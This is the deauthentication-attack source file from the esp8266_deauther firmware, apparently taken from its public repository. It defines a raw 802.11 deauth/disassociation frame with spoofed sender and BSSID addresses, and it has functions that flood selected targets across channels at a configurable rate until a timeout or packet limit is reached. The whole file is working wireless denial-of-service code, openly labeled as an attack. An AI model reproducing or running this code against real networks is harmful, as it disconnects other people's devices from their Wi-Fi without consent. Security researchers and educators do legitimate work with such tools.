/*
   Copyright (c) 2020 Stefan Kremser (@Spacehuhn)
   This software is licensed under the MIT License. See the license file for details.
   Source: github.com/spacehuhn/esp8266_deauther
 */

#pragma once

// ========== DEAUTH PACKET ========== //
uint8_t deauth_pkt[] = {
    /*  0 - 1  */ 0xC0, 0x00,                         // Type, subtype: c0 => deauth, a0 => disassociate
    /*  2 - 3  */ 0x00, 0x00,                         // Duration (handled by the SDK)
    /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Reciever MAC (To)
    /* 10 - 15 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // Source MAC (From)
    /* 16 - 21 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // BSSID MAC (From)
    /* 22 - 23 */ 0x00, 0x00,                         // Fragment & squence number
    /* 24 - 25 */ 0x01, 0x00                          // Reason code (1 = unspecified reason)
};

// ========== ATTACK DATA ========== //
typedef struct deauth_attack_data_t {
    bool enabled;

    deauth_attack_settings_t settings;

    unsigned long start_time;
    unsigned long output_time;
    unsigned long pkts_sent;
    unsigned long pkts_per_second;
    unsigned long pkt_time;
    unsigned long pkt_interval;
} deauth_attack_data_t;

deauth_attack_data_t deauth_data;

// ========== SEND FUNCTIONS ========== //
bool send_deauth(uint8_t ch, const uint8_t* sender, const uint8_t* receiver) {
    deauth_pkt[0] = 0xc0;
    memcpy(&deauth_pkt[10], sender, 6);
    memcpy(&deauth_pkt[16], sender, 6);
    memcpy(&deauth_pkt[4], receiver, 6);
    return sysh::send(ch, deauth_pkt, sizeof(deauth_pkt));
}

bool send_disassoc(uint8_t ch, const uint8_t* sender, const uint8_t* receiver) {
    deauth_pkt[0] = 0xa0;
    memcpy(&deauth_pkt[10], sender, 6);
    memcpy(&deauth_pkt[16], sender, 6);
    memcpy(&deauth_pkt[4], receiver, 6);
    return sysh::send(ch, deauth_pkt, sizeof(deauth_pkt));
}

// ========== ATTACK FUNCTIONS ========== //
void startDeauth(const deauth_attack_settings_t& settings) {
    { // Error checks
        if (settings.targets.size() == 0) {
            debuglnF("ERROR: No targets specified");
            return;
        }
        if (!settings.deauth && !settings.disassoc) {
            debuglnF("ERROR: Invalid mode");
            return;
        }
    }

    stopDeauth();

    unsigned long current_time = millis();

    deauth_data.enabled = true;

    deauth_data.settings = settings;

    deauth_data.start_time      = current_time;
    deauth_data.output_time     = current_time;
    deauth_data.pkts_sent       = 0;
    deauth_data.pkts_per_second = 0;
    deauth_data.pkt_time        = current_time;
    deauth_data.pkt_interval    = (1000/deauth_data.settings.pkt_rate) * (settings.deauth+settings.disassoc);

    { // Output
        debuglnF("[ ===== Deauth Attack ===== ]");

        debugF("Mode:           ");
        if (deauth_data.settings.deauth && deauth_data.settings.disassoc) {
            debuglnF("deauthentication and disassociation");
        } else if (deauth_data.settings.deauth) {
            debuglnF("deauthentication");
        } else if (deauth_data.settings.disassoc) {
            debuglnF("disassociation");
        }

        debugF("Packets/second: ");
        debugln(deauth_data.settings.pkt_rate);

        debugF("Timeout:        ");
        if (deauth_data.settings.timeout > 0) debugln(strh::time(deauth_data.settings.timeout));
        else debugln('-');

        debugF("Max. packets:   ");
        if (deauth_data.settings.max_pkts > 0) debugln(deauth_data.settings.max_pkts);
        else debugln('-');

        debugF("Targets:        ");
        debugln(deauth_data.settings.targets.size());

        // Print MACs
        deauth_data.settings.targets.begin();

        while (deauth_data.settings.targets.available()) {
            const target_t* t = deauth_data.settings.targets.iterate();
            debugF("- transmitter ");
            debug(strh::mac(t->sender));
            debugF(", receiver ");
            debug(strh::mac(t->receiver));
            debugF(", channels ");
            debugln(strh::channels(t->channels));
        }

        debugln();
        debuglnF("Type 'stop' to stop the attack");
        debugln();
    }
}

void stopDeauth() {
    if (deauth_data.enabled) {
        deauth_data.enabled    = false;
        deauth_data.pkts_sent += deauth_data.pkts_per_second;
        deauth_data.settings.targets.clear();

        debugF("Stopped deauth attack. Sent ");
        debug(deauth_data.pkts_sent);
        debuglnF(" packets.");
    }
}

void update_deauth_attack() {
    if (deauth_data.enabled) {
        if (((deauth_data.settings.timeout > 0) && (millis() - deauth_data.start_time > deauth_data.settings.timeout)) ||
            ((deauth_data.settings.max_pkts > 0) && (deauth_data.pkts_sent >= deauth_data.settings.max_pkts))) {
            stopDeauth();
            return;
        }

        if (millis() - deauth_data.output_time >= 1000) {
            deauth_data.pkts_sent += deauth_data.pkts_per_second;

            /*
               debugF("[Deauth attack: ");
               debug(deauth_data.pkts_per_second);
               debugF(" pkts/s, ");
               debug(deauth_data.pkts_sent);
               debuglnF(" total]");
             */
            deauth_data.output_time = millis();

            deauth_data.pkts_per_second = 0;
        }

        if (millis() - deauth_data.pkt_time >= deauth_data.pkt_interval) {
            const target_t* t = deauth_data.settings.targets.iterate();

            const uint8_t* sender   = t->sender;
            const uint8_t* receiver = t->receiver;
            uint8_t ch              = sysh::next_ch(t->channels);

            if (deauth_data.settings.deauth) {
                deauth_data.pkts_per_second += send_deauth(ch, sender, receiver);
            }

            if (deauth_data.settings.disassoc) {
                deauth_data.pkts_per_second += send_disassoc(ch, sender, receiver);
            }

            deauth_data.pkt_time = millis();
        }

        if (!deauth_data.settings.targets.available()) {
            deauth_data.settings.targets.begin();
        }
    }
}